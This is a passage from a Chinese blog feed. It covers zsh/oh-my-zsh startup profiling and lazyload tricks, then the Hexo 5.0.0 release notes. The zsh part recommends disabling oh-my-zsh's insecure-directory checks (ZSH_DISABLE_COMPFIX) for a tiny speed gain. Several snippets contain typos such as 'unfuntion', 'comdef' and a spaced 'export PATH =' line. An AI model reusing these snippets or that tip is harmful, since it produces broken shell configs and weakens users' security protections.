<code>.zshrc</code> 结尾添加如下命令：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-comment\"># .zshrc</span><span class=\"hljs-built_in\">unsetopt</span> XTRACE<span class=\"hljs-built_in\">exec</span> 2&gt;&amp;3 3&gt;&amp;-</code></pre>\n<p>这会在 <code>$HOME</code> 目录下生成一个文件名包含随机字符串的文件（<code>zsh_profile.123456</code> ）。一些介绍 zsh profiling 的文章会推荐使用 <a href=\"http://kcachegrind.sourceforge.net/html/Home.html\">kcachegrind</a> 这个工具可视化这个文件，但是我们只需要知道是什么拖累了 zsh 冷启动，将这个文件格式化一下即可。这里提供一个简单的脚本：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-meta\">#!/usr/bin/env zsh</span><span class=\"hljs-built_in\">typeset</span> -a lines<span class=\"hljs-built_in\">typeset</span> -i prev_time=0<span class=\"hljs-built_in\">typeset</span> prev_command<span class=\"hljs-keyword\">while</span> <span class=\"hljs-built_in\">read</span> line; <span class=\"hljs-keyword\">do</span>    <span class=\"hljs-keyword\">if</span> [[ <span class=\"hljs-variable\">$line</span> =~ <span class=\"hljs-string\">'^.*\\+([0-9]{10})\\.([0-9]{6})[0-9]* (.+)'</span> ]]; <span class=\"hljs-keyword\">then</span>        <span class=\"hljs-built_in\">integer</span> this_time=<span class=\"hljs-variable\">$match</span>[1]<span class=\"hljs-variable\">$match</span>[2]        <span class=\"hljs-keyword\">if</span> [[ <span class=\"hljs-variable\">$prev_time</span> -gt 0 ]]; <span class=\"hljs-keyword\">then</span>            time_difference=$(( <span class=\"hljs-variable\">$this_time</span> - <span class=\"hljs-variable\">$prev_time</span> ))            lines+=<span class=\"hljs-string\">\"<span class=\"hljs-variable\">$time_difference</span> <span class=\"hljs-variable\">$prev_command</span>\"</span>        <span class=\"hljs-keyword\">fi</span>        prev_time=<span class=\"hljs-variable\">$this_time</span>        <span class=\"hljs-built_in\">local</span> this_command=<span class=\"hljs-variable\">$match</span>[3]        <span class=\"hljs-keyword\">if</span> [[ <span class=\"hljs-variable\">${#this_command}</span> -le 80 ]]; <span class=\"hljs-keyword\">then</span>            prev_command=<span class=\"hljs-variable\">$this_command</span>        <span class=\"hljs-keyword\">else</span>            prev_command=<span class=\"hljs-string\">\"<span class=\"hljs-variable\">${this_command:0:77}</span>...\"</span>        <span class=\"hljs-keyword\">fi</span>    <span class=\"hljs-keyword\">fi</span><span class=\"hljs-keyword\">done</span> &lt; <span class=\"hljs-variable\">${1:-/dev/stdin}</span><span class=\"hljs-built_in\">print</span> -l <span class=\"hljs-variable\">${(@On)lines}</span></code></pre>\n<p>将上述内容保存在 <code>$HOME</code> 目录下 <code>format_profile.zsh</code> 文件中，然后在终端中执行：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-built_in\">cd</span> <span class=\"hljs-variable\">$HOME</span>$ chmod +x format_profile.zsh$ ./format_profile.zsh zsh_profile.123456 | head -n 30356910 _zsh_nvm_auto_use:14&gt; [[ none != N/A ]]307791 /Users/sukka/.zshrc:312&gt; hexo <span class=\"hljs-string\">'--completion=zsh'</span>178444 /Users/sukka/.zshrc:310&gt; thefuck --<span class=\"hljs-built_in\">alias</span>161193 nvm_version:21&gt; VERSION=N/A148555 nvm_version:21&gt; VERSION=N/A96497 (<span class=\"hljs-built_in\">eval</span>):4&gt; pyenv <span class=\"hljs-built_in\">rehash</span>58759 /Users/sukka/.zshrc:311&gt; pyenv init -48629 nvm_auto:15&gt; VERSION=<span class=\"hljs-string\">''</span>42779 /Users/sukka/.zshrc:114&gt; FPATH=/usr/<span class=\"hljs-built_in\">local</span>/share/zsh/site-functions:/usr/<span class=\"hljs-built_in\">local</span>...42527 nvm_auto:15&gt; nvm_resolve_local_alias default41620 nvm_resolve_local_alias:7&gt; VERSION=<span class=\"hljs-string\">''</span>35577 nvm_resolve_local_alias:7&gt; VERSION=<span class=\"hljs-string\">''</span>29444 _zsh_nvm_load:6&gt; <span class=\"hljs-built_in\">source</span> /Users/sukka/.nvm/nvm.sh24967 compaudit:154&gt; _i_wfiles=( )24889 nvm_resolve_alias:15&gt; ALIAS_TEMP=<span class=\"hljs-string\">''</span>22000 nvm_auto:18&gt; nvm_rc_version20890 nvm_ls:29&gt; PATTERN=default[Redacted]</code></pre>\n<p>这样就一目了然了。可以看到，除了 <code>nvm</code> 以外、<code>hexo</code> 的自动补全、<code>thefuck</code> 的初始化、<code>pyenv</code> 都大幅拖慢了 zsh 的启动速度。</p>\n<h2>Lazyload</h2>\n<p>你可能听过 <a href=\"https://blog.skk.moe/post/img-lazyload-hexo/\">网页的图片可以 lazyload</a>、<a href=\"https://blog.skk.moe/post/prevent-disqus-from-slowing-your-site/\">Disqus 评论系统可以 lazyload</a>，但是 <code>.zshrc</code> 一样也有 lazyload。lazyload 的特点是启动时快，首次使用时慢，因此很适合用于优化不常用而且初始化非常耗时的功能。</p>\n<p>lazyload 的方法是声明一个占位函数，当执行这个函数时完成对真实命令的初始化、并移除命令占位。以 pyenv 为例：</p>\n<pre><code class=\"hljs sh\"><span class=\"hljs-comment\"># 提前将 .pyenv/shims 添加到 PATH 中，这样即使 pyenv 没有初始化也可以使用 Python</span><span class=\"hljs-built_in\">export</span> PATH=<span class=\"hljs-string\">\"/Users/sukka/.pyenv/shims:<span class=\"hljs-variable\">${PATH}</span>\"</span><span class=\"hljs-function\"><span class=\"hljs-title\">pyenv</span></span>() {  <span class=\"hljs-comment\"># 移除占位函数</span>  unfuntion pyenv  <span class=\"hljs-comment\"># 初始化 pyenv</span>  <span class=\"hljs-built_in\">eval</span> <span class=\"hljs-string\">\"<span class=\"hljs-subst\">$(command pyenv init -)</span>\"</span>  <span class=\"hljs-comment\"># 继续执行 pyenv 命令</span>  pyenv <span class=\"hljs-string\">\"<span class=\"hljs-variable\">$@</span>\"</span>}</code></pre>\n<p>pyenv 在初始化时会自动加载补全（completion），但是由于 lazyload、第一次执行 <code>pyenv</code> 时就没有补全了，因此还需要为补全添加 lazyload：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-function\"><span class=\"hljs-title\">__lazyload_completion_pyenv</span></span>() {  <span class=\"hljs-comment\"># 删除 pyenv 命令补全的占位</span>  comdef -d pyenv  <span class=\"hljs-comment\"># 移除 pyenv 占位函数</span>  <span class=\"hljs-built_in\">unfunction</span> pyenv  <span class=\"hljs-comment\"># 加载真正的 pyenv 命令补全</span>  <span class=\"hljs-built_in\">source</span> <span class=\"hljs-string\">\"<span class=\"hljs-subst\">$(brew --prefix pyenv)</span>/completions/pyenv.zsh\"</span>}compdef __lazyload_completion_pyenv pyenv</code></pre>\n<p>这样，当首次输入 <code>pyenv</code> 并按下 Tab 时会加载 pyenv 的命令补全，第二次按下 Tab 时就可以正常显示命令补全了。</p>\n<p>将上述 lazyload 封装成函数便于调用：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-function\"><span class=\"hljs-title\">sukka_lazyload_add_command</span></span>() {    <span class=\"hljs-built_in\">eval</span> <span class=\"hljs-string\">\"<span class=\"hljs-variable\">$1</span>() { \\</span><span class=\"hljs-string\">        unfunction <span class=\"hljs-variable\">$1</span> \\</span><span class=\"hljs-string\">        _sukka_lazyload__command_<span class=\"hljs-variable\">$1</span> \\</span><span class=\"hljs-string\">        <span class=\"hljs-variable\">$1</span> \\$@ \\</span><span class=\"hljs-string\">    }\"</span>}<span class=\"hljs-function\"><span class=\"hljs-title\">sukka_lazyload_add_completion</span></span>() {    <span class=\"hljs-built_in\">local</span> comp_name=<span class=\"hljs-string\">\"_sukka_lazyload__compfunc_<span class=\"hljs-variable\">$1</span>\"</span>    <span class=\"hljs-built_in\">eval</span> <span class=\"hljs-string\">\"<span class=\"hljs-variable\">${comp_name}</span>() { \\</span><span class=\"hljs-string\">        compdef -d <span class=\"hljs-variable\">$1</span>; \\</span><span class=\"hljs-string\">        _sukka_lazyload_completion_<span class=\"hljs-variable\">$1</span>; \\</span><span class=\"hljs-string\">    }\"</span>    compdef <span class=\"hljs-variable\">$comp_name</span> <span class=\"hljs-variable\">$1</span>}</code></pre>\n<p>使用封装好的 lazyload 函数添加 <code>pyenv</code> 和 <code>thefuck</code> 的 lazyload、Hexo completion 的 lazyload：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-function\"><span class=\"hljs-title\">_sukka_lazyload__command_pyenv</span></span>() {  <span class=\"hljs-comment\"># pyenv 初始化</span>  <span class=\"hljs-built_in\">eval</span> <span class=\"hljs-string\">\"<span class=\"hljs-subst\">$(command pyenv init -)</span>\"</span>}<span class=\"hljs-function\"><span class=\"hljs-title\">_sukka_lazyload__compfunc_pyenv</span></span>() {  <span class=\"hljs-comment\"># pyenv 命令补全</span>  <span class=\"hljs-built_in\">source</span> <span class=\"hljs-string\">\"<span class=\"hljs-subst\">$(brew --prefix pyenv)</span>/completions/pyenv.zsh\"</span>}<span class=\"hljs-comment\"># 添加 pyenv 的 lazyload</span>sukka_lazyload_add_command pyenvsukka_lazyload_add_completion pyenv<span class=\"hljs-function\"><span class=\"hljs-title\">_sukka_lazyload__command_fuck</span></span>() {  <span class=\"hljs-comment\"># fuck 初始化</span>  <span class=\"hljs-built_in\">eval</span> $(thefuck --<span class=\"hljs-built_in\">alias</span>)}<span class=\"hljs-comment\"># 添加 fuck 的 lazyload</span>sukka_lazyload_add_command fuck<span class=\"hljs-function\"><span class=\"hljs-title\">_sukka_lazyload__completion_hexo</span></span>() {  <span class=\"hljs-comment\"># hexo 的 completion</span>  <span class=\"hljs-built_in\">eval</span> $(hexo --completion=zsh)}<span class=\"hljs-comment\"># 添加 hexo completion 的 lazyload</span>sukka_lazyload_add_completion hexo</code></pre>\n<h2>替换 NVM</h2>\n<p>我使用 nvm 的方式是 <code>zsh-nvm</code> 插件。由于我的开发环境也高度依赖 <code>.nvmrc</code> 文件，所以不得不启用 nvm auto use。由于我的许多工具高度依赖 Node.js（如我的 <a href=\"https://nali.skk.moe/\">Nali CLI</a>），lazyload nvm 也是不现实的。我不得不寻找另一个代替 nvm 的 Node.js 版本管理器，最后我选中了 <a href=\"https://github.com/tj/n\"><code>tj/n</code></a>。</p>\n<p>首先是卸载 nvm、nvm 安装的所有 Node.js 版本、以及 zsh-nvm 插件：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-comment\"># 卸载 nvm 及其安装的 Node.js</span>$ rm -rf <span class=\"hljs-variable\">$HOME</span>/.nvm<span class=\"hljs-comment\"># 删除 zsh-nvm 插件</span>$ rm -rf <span class=\"hljs-variable\">$ZSH</span>/custom/plugins/zsh-nvm<span class=\"hljs-comment\"># 除了删除目录，还需要在 .zshrc 中的 plugins 数组中删除 zsh-nvm</span></code></pre>\n<p>接着安装 <code>tj/n</code> 作为 Node.js 版本管理器，macOS 上可以通过 Homebrew 直接安装：</p>\n<pre><code class=\"hljs bash\">$ brew install n</code></pre>\n<p>在 <code>.zshrc</code> 中配置 <code>tj/n</code>：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-comment\"># tj/n 的路径</span><span class=\"hljs-built_in\">export</span> N_PREFIX=<span class=\"hljs-string\">\"<span class=\"hljs-variable\">$HOME</span>/.n\"</span><span class=\"hljs-comment\"># 当切换 Node.js 版本时保留 npm</span><span class=\"hljs-built_in\">export</span> N_PRESERVE_NPM=1<span class=\"hljs-comment\"># 将 tj/n 添加到 PATH</span><span class=\"hljs-built_in\">export</span> PATH = <span class=\"hljs-string\">\"<span class=\"hljs-variable\">$N_PREFIX</span>/bin:<span class=\"hljs-variable\">$PATH</span>\"</span></code></pre>\n<h2>使用 zsh 内置语法</h2>\n<p>zsh 强大之处不仅在于内建的插件、优雅的使用方式，更重要的是极其强大的语法。在 <code>.zshrc</code> 广泛使用 zsh 内置的语法可以大幅提高执行性能。</p>\n<h3>zsh 判断命令是否存在</h3>\n<p>我们经常需要在 <code>.zshrc</code> 之中编写命令是否存在的条件语句，比如「仅当命令存在时加载该命令的自动补全」，或者「当 Node.js 存在时输出 Node.js 版本」。通常情况下我们会写出以下三种条件判断方式：</p>\n<pre><code class=\"hljs bash\">[[ <span class=\"hljs-built_in\">command</span> -v node &amp;&gt;/dev/null ]] &amp;&amp; node -v[[ <span class=\"hljs-built_in\">which</span> -a node &amp;&gt;/dev/null ]] &amp;&amp; node -v[[ <span class=\"hljs-built_in\">type</span> node &amp;&gt;/dev/null ]] &amp;&amp; node -v</code></pre>\n<p>但是在 zsh 中，还有一种速度更快的判断命令存在的方法：</p>\n<pre><code class=\"hljs bash\">(( $+commands[node] )) &amp;&amp; node -v</code></pre>\n<p>zsh 提供了一个数组元素查找语法 <code>$+array[item]</code> （元素存在则返回 1 否则返回 0），同时 zsh 也维护了一个命令数组 <code>$commands</code>，在数组中检索元素比调用 <code>which</code>、<code>type</code>、<code>command -v</code> 命令都要快许多。</p>\n<h3>变量字符串查找</h3>\n<p>在 <code>.zshrc</code> 中鲜少需要用到这样的语法，不过依然存在一些 case，比如为了避免向 <code>$FPATH</code> 中重复添加 Homebrew 的自动补全，提前检查 <code>$FPATH</code> 中是否已经包含了 Homebrew 的路径。一般常见的写法都涉及到 <code>echo</code> 和 <code>grep</code> ：</p>\n<pre><code class=\"hljs bash\">[[ $(<span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">$FPATH</span> | grep <span class=\"hljs-string\">\"/usr/local/share/zsh/site-functions\"</span>) ]] &amp;&amp; <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">\"homebrew exists in fpath\"</span></code></pre>\n<p>但是在 zsh 中我们不需要 <code>grep</code> 也可以实现同样的功能：</p>\n<pre><code class=\"hljs bash\">(( <span class=\"hljs-variable\">$FPATH</span>[(I)/usr/<span class=\"hljs-built_in\">local</span>/share/zsh/site-functions] )) &amp;&amp; <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">\"homebrew exists in fpath\"</span></code></pre>\n<p>zsh 内置了在变量中匹配字符串的语法：<code>$variable[(i)keyword]</code> 和 <code>$variable[(I)keyword]</code>，前者是从左往右寻找、后者是从右往左寻找，返回值为第一个匹配的首字符位置，当没有匹配时返回值则是变量的最终位置，也就是说当找不到匹配时 <code>(i)</code> 会返回字符串的长度、而 <code>(I)</code> 会返回 0。因此只需要从右往左寻找、判断返回值是否为 0 即可，搭配将数字转化为布尔值的 <code>(( ))</code> 就可以写出又快又漂亮的条件语句。</p>\n<h3>变量字符串替换</h3>\n<p>当需要截断或者替换字符串时，大部分人第一时间会想到 <code>sed</code> ，因当此需要替换变量中的字符时自然而然的会使用 <code>echo | sed</code>。比如，在 macOS 中主机名 <code>$HOST</code> 变量通常以 <code>.local</code> 结尾：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">$HOST</span>Sukka-MBP.local</code></pre>\n<p>如果要显示 <code>Sukka-MBP</code> （在 prompt 中常常会用到）就需要写成：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">$HOST</span> | sed -e <span class=\"hljs-string\">\"s/.local//\"</span>Sukka-MBP</code></pre>\n<p>但是，强大的 zsh 内置了简单的变量字符串替换语法，使用下述命令可以达到相同的效果：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">${HOST/.local/}</span>Sukka-MBP$ <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">${HOST/.local/.foxtail}</span>Sukka-MBP.foxtail</code></pre>\n<h2>其它优化手段</h2>\n<h3>禁用多余的插件</h3>\n<p>oh my zsh 在 Wiki 里说「Add wisely, as too many plugins slow down shell startup」。通过 profiling 可以发现一些插件（如 <code>git</code> 插件）执行耗时也不短。考虑到 oh my zsh 内置的 <code>git</code> 插件只是一些 alias、大部分我都用不到，因此将其从 <code>plugins</code> 数组中移除。</p>\n<h3>避免产生子进程</h3>\n<p>在 shell 中有不少语法会产生子进程。由于这些不受控制的子进程可能会产生其它子进程、从而导致潜在的巨大开销。常见的会产生子进程的语法有是 <code>eval</code> 和 Command substitution，在编写 <code>.zshrc</code> 时应该尽量避免使用它们。</p>\n<p>例如，Homebrew 是通过 Ruby —— 一种没有性能优势的语言编写的，而且 Homebrew 的开发者甚至因为不会翻转二叉树而错失了 Google 的 offer（想必大家大体可以猜得出 Homebrew 中的负优化），因此在 zsh 启动时产生一个子进程运行 Homebrew 将是不能忍受的，绝大部分使用 Homebrew 的人都不会改变 Homebrew 的路径，因此与其在 <code>.zshrc</code> 中使用 <code>$(brew --prefix)</code>，不如直接将命令执行的结果（<code>/usr/local</code>）直接写在 <code>.zshrc</code> 中。</p>\n<h3>启用 ZSH_DISABLE_COMPFIX</h3>\n<p>oh my zsh 内置了安全功能、避免 oh my zsh 插件使用不安全的目录和文件，但是这意味着插件在加载时需要通过一系列 security checker。通过禁用安全功能 （<code>export ZSH_DISABLE_COMPFIX=\"true\"</code>）可以使 zsh 启动速度加快 0.06s。微不足道，但值得一试。</p>\n<h2>针对 macOS 的优化</h2>\n<h3>path_helper</h3>\n<p>和 Linux 不同，在 macOS 上 zsh 启动序列的第一项为 <code>/etc/zprofile</code> 而不是 <code>~/.zprofile</code>。macOS 通过 <code>/etc/zprofile</code> 来调用 <code>path_helper</code>：</p>\n<pre><code class=\"hljs bash\">$ cat /etc/zprofile<span class=\"hljs-comment\"># System-wide .profile for sh(1)</span><span class=\"hljs-keyword\">if</span> [ -x /usr/libexec/path_helper ]; <span class=\"hljs-keyword\">then</span>  <span class=\"hljs-built_in\">eval</span> `/usr/libexec/path_helper -s`<span class=\"hljs-keyword\">fi</span><span class=\"hljs-keyword\">if</span> [ <span class=\"hljs-string\">\"<span class=\"hljs-variable\">${BASH-no}</span>\"</span> != <span class=\"hljs-string\">\"no\"</span> ]; <span class=\"hljs-keyword\">then</span>  [ -r /etc/bashrc ] &amp;&amp; . /etc/bashrc<span class=\"hljs-keyword\">fi</span></code></pre>\n<p>而 <code>path_helper</code> 又会读取 <code>/etc/paths</code> 、<code>/etc/paths/d</code>、<code>etc/manpaths</code> 和  <code>etc/manpaths.d</code>、并将其添加到 <code>$PATH</code> 和 <code>$MANPATH</code> 变量中。通过 <code>path_helper</code> macOS 提供了一种快速在不同 shell 中共享  <code>$PATH</code> 和 <code>$MANPATH</code> 的方法。过去，<code>path_helper</code> 是一个 <a href=\"https://mjtsai.com/blog/2009/04/01/slow-opening-terminal-windows\">运行速度很慢的 shell 脚本</a> 以至于有人制作了 <a href=\"https://gist.github.com/mkhl/123525\">专门的 patch</a>、甚至 <a href=\"https://github.com/mgprot/path_helper\">使用 Perl</a> 重写了一个替代品。不过 macOS 意识到了这个问题，现在 <code>path_helper</code> 不再是一个脚本而是一个预编译好的二进制文件。如果你通过 profiling 发现 <code>path_helper</code> 有在拖累 zsh 启动，那么可以考虑放弃使用 <code>/etc/paths/d</code>、而是在 <code>.zshrc</code> 中直接维护 <code>$PATH</code>。</p>\n<h3>login process</h3>\n<p>默认在启动、终端登陆 shell 时会触发 macOS 的 <code>login -fp username</code>。这一操作会调用 <code>syslog()</code> 函数向 <code>/var/log/asl</code> 写入日志、并读取上一次登录记录、以 <code>Last login</code> 的形式显示出来。你可以使用下述命令证实这一行为：</p>\n<pre><code class=\"hljs bash\">ps -ef | grep login</code></pre>\n<p>如果想要通过减少日志写入来加快 zsh 启动速度，可以修改 <code>etc/asl.conf</code> 配置文件中定义的日志等级。</p>\n<p>不少文章也提到，修改 iTerm2 设置中的 <code>Login Command</code> 为 <code>/bin/zsh</code> 可以加快 zsh 启动速度，本质上也是绕过了上述读取和写入日志的环节。</p>\n<blockquote><p>ASL 即 <strong>A</strong>pple <strong>S</strong>ystem <strong>L</strong>og，macOS 10.12 起被弃用，但是仍有系统组件在使用这一接口。</p></blockquote>\n<h2>尾声</h2>\n<p>经过一系列优化，我终于让 zsh 启动速度提升了十倍，速度甚至不亚于 fish 等以性能著称的 shell：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-keyword\">for</span> i <span class=\"hljs-keyword\">in</span> $(seq 1 5); <span class=\"hljs-keyword\">do</span> /usr/bin/time /bin/zsh -i -c <span class=\"hljs-built_in\">exit</span>; <span class=\"hljs-keyword\">done</span>        0.14 real         0.08 user         0.05 sys        0.12 real         0.07 user         0.04 sys        0.12 real         0.07 user         0.04 sys        0.13 real         0.07 user         0.04 sys        0.13 real         0.07 user         0.04 sys</code></pre>\n<p>如果对我的 <code>.zshrc</code> 文件感兴趣，可以 <a href=\"https://github.com/SukkaW/dotfiles/blob/master/_zshrc/macos.zshrc\">前往 GitHub 查看我开源的 dotfiles</a>。</p>\n<div class=\"license\"> <div class=\"license-title\">我就感觉到快 —— zsh 和 oh my zsh 冷启动速度优化</div> <div class=\"license-link\"><a href=\"https://blog.skk.moe/post/make-oh-my-zsh-fly/\">https://blog.skk.moe/post/make-oh-my-zsh-fly/</a></div> <div class=\"license-meta\"> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">本文作者</div> <div class=\"license-meta-text\">Sukka</div> </div> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">发布于</div> <div class=\"license-meta-text\">2020-08-10</div> </div>\n<div class=\"license-meta-item\"> <div class=\"license-meta-title\">许可协议</div> <div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div> </div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/make-oh-my-zsh-fly/"},{"title":"Hexo 5.0.0 正式发布","date":"2020-07-24 02:24:00","description":"\n<p>Node.js 上最快的静态站点生成器 Hexo 发布了 5.0.0 版本。作为 Hexo 核心团队成员，让我为大家介绍一下 Hexo 5.0.0 中的新特性，以及如何从 Hexo 4.x 版本升级到 Hexo 5.0.0。</p>\n<h2>新特性</h2>\n<h3>通过 npm 安装主题</h3>\n<p>过去，安装 Hexo 主题需要 <code>git clone</code> 或者下载、解压 zip；更新主题时还需要迁移 <code>_config.yml</code> 。Hexo 5.0.0 支持通过 npm 安装主题。现在安装一个主题只需要三步：</p>\n<ul>\n<li><p>使用  <code>npm install hexo-theme-[主题的名称]</code> 即可安装主题；</p></li>\n<li>\n<p>在站点的 <code>_config.yml</code> 中指定主题的名称：<br><br></p>\n<pre><code class=\"hljs yaml\"><span class=\"hljs-attr\">theme:</span> <span class=\"hljs-string\">\"[主题的名称]\"</span></code></pre>\n</li>\n<li><p>在站点根目录下新建一个文件 <code>_config.[主题的名称].yml</code>，在该文件中填入主题的配置即可。</p></li>\n</ul>\n<p>对于主题的开发者、插件开发者，以及进阶的 Hexo 用户来说，这是你们想要了解的技术细节：</p>\n<ul>\n<li>为了保证向后兼容性，Hexo 依然支持从 <code>themes/[主题的名称]</code> 目录加载主题。其中，<code>themes/[主题的名称]</code> 的优先级高于 <code>node_modules/hexo-theme-[主题的名称]</code>。也就是说，只有当 Hexo 发现 <code>themes/[主题的名称]</code> 目录不存在时，才会从  <code>node_modules/hexo-theme-[主题的名称]</code> 目录中加载主题。</li>\n<li>Hexo 5.0.0 新增了通过站点根目录下 <code>_config.[主题的名称].yml</code> 文件配置主题的功能。这是除主题目录下的 <code>_config.yml</code> 文件、以及站点配置文件的 <code>theme_config</code> 字段外第三种配置主题的方式。</li>\n<li>为保证向后兼容性，Hexo 会按照如下优先级 deep merge 三份主题配置：<code>站点配置文件的 theme_config 字段 &gt; 站点根目录下的 _config.[主题的名称].yml &gt; 主题目录下的 _config.yml</code>。因此，我们建议主题开发者尽量限制配置文件层级为 1 级，避免在 deep merge 时更深层级的配置项会被合并而不是被覆盖。</li>\n</ul>\n<h3>PrismJS 代码高亮支持</h3>\n<p>Hexo 5.0.0 新增了 PrismJS 代码高亮支持。</p>\n<p>相比 highlight.js 可以在 Node.js 环境执行（即：可在 Hexo 生成页面时进行代码高亮）不同，PrismJS 是一个轻量级的代码高亮库，绝大部分插件都依赖浏览器中执行。Hexo 为了尽可能兼容 PrismJS 的功能和插件，提供了「生成时渲染」和「浏览器渲染」两种模式：前者只需在主题之中引入 PrismJS 的 CSS 即可，但是无法使用大部分 PrismJS 的插件；后者需要在主题中同时引入 PrismJS 的 CSS 和 <code>prism.js</code>，但是可以兼容 PrismJS 大部分插件。</p>\n<p>关于 Hexo 主题的开发者适配 Hexo 的两种代码高亮的技术细节，我们专门撰写了 <a href=\"https://hexo.io/docs/syntax-highlight\">相关的文档页面</a> 以供参考。</p>\n<h3>静态 HTML 片段插入</h3>\n<p>插件开发者经常需要在页面中插入 HTML 片段：播放器插件需要往页面中插入 <code>player.css</code> 和 <code>player.js</code>，lazyload 插件的作者需要往页面中插入 <code>lazyload.js</code>，Live2D 插件的作者需要往页面中插入对应的 CSS 和 JS，等等。Hexo 5.0.0 新增了一个插件 API 接口 <code>Injector</code>，用于往页面的 <code>&lt;head&gt;</code> 和 <code>&lt;body&gt;</code> 标签中注入静态 HTML 片段。这一功能支持：</p>\n<ul>\n<li>在 <code>&lt;head&gt;</code> 之后、<code>&lt;/head&gt;</code> 之前、<code>&lt;body&gt;</code> 之后 和 <code>&lt;/body&gt;</code> 之前四个位置插入代码。</li>\n<li>支持只在特定页面注入 HTML 片段 —— 插件开发者可以仅往文章页面插入 HTML 片段而不影响其他页面如首页和归档。</li>\n</ul>\n<p>插件开发者请参考 Hexo 的 [Injector API 文档] 了解具体使用方法。</p>\n<h3>其他新特性</h3>\n<p>除上述三个重磅功能外，Hexo 还新增了其他功能，如：</p>\n<ul>\n<li>标签插件 API 新增 <code>unregister</code>å 方法</li>\n<li>\n<code>tagcloud</code> 辅助函数新增支持自定义 class 属性和 level</li>\n<li>\n<code>feed_tag</code> 辅助函数增加对 hexo-generator-feed 插件的兼容</li>\n<li>\n<code>youtube</code> 标签插件新增对 YouTube 播放列表的支持，以及可选使用 <code>www.youtube-nocookie.com</code> 域名</li>\n<li>\n<code>post_link</code> 标签插件在找不到对应文章时将会显示警告信息</li>\n<li>\n<code>post_permalink</code> 配置项新增支持 <code>:second</code> 属性</li>\n<li>当文章的标签插件出现渲染错误时，报错信息将会显示出错文件的路径</li>\n</ul>\n<h2>修复的 Bug</h2>\n<ul>\n<li>修复了 数个相邻的标签插件 无法渲染的 Bug</li>\n<li>修复了 文章中的代码块由于包含大括号（<code>{</code> 和 <code>}</code>）导致的渲染失败</li>\n<li>修复了 包含 Source Map 的 Hexo 插件无法加载的 Bug</li>\n<li>修复了 <code>code</code> 标签插件无法解析 <code>wrap</code> 选项的问题</li>\n<li>当 <code>post_asset_folder</code> 功能启用时，<code>hexo new</code> 命令将不再生成错误的 <code>index</code> 目录</li>\n</ul>\n<h2>性能改进</h2>\n<p>一如既往，Hexo 5.0.0 也带来了一系列性能改进，以提升 Hexo 的渲染性能。</p>\n<ul>\n<li>改进了标签插件的渲染性能</li>\n<li>优化了 <code>meta[generator]</code> 标签注入的逻辑</li>\n<li>优化为外部链接添加 <code>rel=noopenner</code> 和 <code>target=\"_blank\"</code> 功能的性能</li>\n<li>确保 <code>after_render:html</code> Filter 在每个页面只执行一次</li>\n<li>优化了 Filter API 的执行速度</li>\n<li>延迟加载代码高亮，减少 Hexo 启动用时</li>\n<li>当执行 <code>hexo clean</code> 时不再加载无关的插件</li>\n</ul>\n<h2>从 Hexo 4.x 升级到 Hexo 5.x</h2>\n<p>Hexo 5.0.0 引入了少数不向后兼容的功能，因此当你升级到 Hexo 5.0.0 时，需要遵循以下步骤进行迁移：</p>\n<h3>升级 Node.js</h3>\n<p>Hexo 5.0.0 不再支持 Node.js 8 及更低版本。为了使用 Hexo 5.0.0，请确保 Node.js 版本不低于 10.13.0。</p>\n<h3>文章 Front-Matter 不再支持 keywords 字段</h3>\n<p>过去这一字段被主要用于 <code>open_graph</code> 辅助函数。升级到 Hexo 5.0.0 后你无需去除现有文章的 Front-Matter 中的 <code>keywords</code> 字段，但这一字段将不会再起任何作用。</p>\n<h3>文章 Front-Matter 中 permalink 字段的行为</h3>\n<p>Hexo 5.0.0 修改了在文章的 Front Matter 中指定 <code>permalink</code> 字段的行为，与独立页面的 <code>permalink</code> 的行为一致。</p>\n<h3>全局变量中不再包含 Lodash</h3>\n<p>Hexo 5.0.0 去除了全局变量中的 Lodash，因此主题无法继续在模板中使用 Lodash。主题开发者应该遵循 <a href=\"https://github.com/you-dont-need/You-Dont-Need-Lodash-Underscore\">You-Dont-Need-Lodash-Underscore</a> 进行迁移。</p>\n<h3>用 updated_option 配置代替 use_date_for_updated</h3>\n<p>Hexo 4.0.0 提供的 <code>use_date_for_updated</code> 配置项现已被 <code>updated_option</code> 替代。</p>\n<ul>\n<li>\n<code>use_date_for_updated: true</code> 现在等价于 <code>updated_option: 'date'</code>。</li>\n<li>\n<code>use_date_for_updated: false</code> 现在等价于 <code>updated_option: 'mtime'</code>。</li>\n</ul>\n<div class=\"license\"> <div class=\"license-title\">Hexo 5.0.0 正式发布</div> <div class=\"license-link\"><a href=\"https://blog.skk.moe/post/hexo-5/\">https://blog.skk.moe/post/hexo-5/</a></div> <div class=\"license-meta\"> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">本文作者</div> <div class=\"license-meta-text\">Sukka</div> </div> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">发布于</div> <div class=\"license-meta-text\">2020-07-24</div> </div>\n<div class=\"license-meta-item\"> <div class=\"license-meta-title\">许可协议</div> <div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div> 